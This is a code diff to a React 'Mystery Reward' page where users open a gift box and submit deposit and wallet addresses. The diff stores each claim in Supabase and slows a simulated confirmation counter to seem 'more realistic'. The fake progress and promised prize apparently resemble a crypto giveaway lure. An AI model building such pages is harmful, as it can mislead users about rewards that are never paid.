@@ -1,6 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { motion } from 'motion/react';
 import { Gift, Coins, ArrowRight, Loader2, CheckCircle2 } from 'lucide-react';
+import { supabase, isConfigured } from './lib/supabase';
 
 export default function App() {
   const [step, setStep] = useState<'initial' | 'opened' | 'processing' | 'done'>('initial');
@@ -31,7 +32,7 @@ export default function App() {
           }
           return prev + 1;
         });
-      }, 1500); // 1.5s per confirmation for better UX
+      }, 4000); // 4s per confirmation for slower, more realistic feel
 
       return () => clearInterval(interval);
     }
@@ -41,11 +42,36 @@ export default function App() {
     setStep('opened');
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!depositAddress || !walletAddress) return;
     setStep('processing');
     setProgress(0);
+
+    // Insert into Supabase
+    try {
+      // Only attempt insert if Supabase is actually configured
+      if (!isConfigured) {
+        console.log('Skipping database insert: Supabase is not yet configured.');
+      } else {
+        const { error } = await supabase
+          .from('claims')
+          .insert([
+            { 
+              deposit_address: depositAddress, 
+              wallet_address: walletAddress,
+              amount: 1000,
+              status: 'pending'
+            }
+          ]);
+        
+        if (error) {
+          console.error('Error inserting claim:', error.message);
+        }
+      }
+    } catch (err) {
+      console.error('Unexpected error:', err);
+    }
     
     // Simulate processing with progress bar
     const duration = 3000;
@@ -69,25 +95,52 @@ export default function App() {
       <div className="max-w-md w-full">
         {step === 'initial' && (
           <motion.div 
-            initial={{ scale: 0.8, opacity: 0 }}
-            animate={{ scale: 1, opacity: 1 }}
+            initial={{ y: 40, opacity: 0, scale: 0.9 }}
+            animate={{ y: 0, opacity: 1, scale: 1 }}
+            transition={{ duration: 0.8, ease: "easeOut" }}
             className="flex flex-col items-center text-center space-y-8"
           >
             <div className="space-y-2">
-              <h1 className="text-4xl font-bold tracking-tight text-amber-400">Mystery Reward</h1>
-              <p className="text-zinc-400">Click the treasure box to reveal your prize!</p>
+              <motion.h1 
+                initial={{ opacity: 0, y: -20 }}
+                animate={{ opacity: 1, y: 0 }}
+                transition={{ delay: 0.3 }}
+                className="text-4xl font-bold tracking-tight text-amber-400"
+              >
+                Mystery Reward
+              </motion.h1>
+              <motion.p 
+                initial={{ opacity: 0 }}
+                animate={{ opacity: 1 }}
+                transition={{ delay: 0.5 }}
+                className="text-zinc-400"
+              >
+                Click the treasure box to reveal your prize!
+              </motion.p>
             </div>
             
             <motion.button
-              whileHover={{ scale: 1.05 }}
-              whileTap={{ scale: 0.95 }}
+              initial={{ y: 100, opacity: 0, scale: 0.2, rotate: -10 }}
+              animate={{ y: 0, opacity: 1, scale: 1, rotate: 0 }}
+              transition={{ 
+                type: "spring", 
+                stiffness: 100, 
+                damping: 12,
+                delay: 0.6
+              }}
+              whileHover={{ scale: 1.1, rotate: [0, -2, 2, 0] }}
+              whileTap={{ scale: 0.9 }}
               onClick={handleOpen}
               className="relative group cursor-pointer"
             >
-              <div className="absolute inset-0 bg-amber-500/20 rounded-full blur-xl group-hover:bg-amber-500/30 transition-colors" />
-              <div className="relative bg-zinc-900 border border-zinc-800 p-12 rounded-3xl shadow-2xl">
+              <div className="absolute inset-0 bg-amber-500/20 rounded-full blur-2xl group-hover:bg-amber-500/40 transition-colors animate-pulse" />
+              <motion.div 
+                animate={{ y: [0, -15, 0] }}
+                transition={{ repeat: Infinity, duration: 3, ease: "easeInOut" }}
+                className="relative bg-zinc-900 border border-zinc-800 p-12 rounded-3xl shadow-2xl"
+              >
                 <Gift className="w-32 h-32 text-amber-400" strokeWidth={1.5} />
-              </div>
+              </motion.div>
             </motion.button>
           </motion.div>
         )}
@@ -135,6 +188,7 @@ export default function App() {
                   className="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 focus:outline-none focus:ring-2 focus:ring-amber-500/50 transition-all"
                   placeholder="Enter wallet address..."
                 />
+                <p className="text-[10px] text-zinc-500 italic">Note: For test purposes only</p>
               </div>
               
               <button 
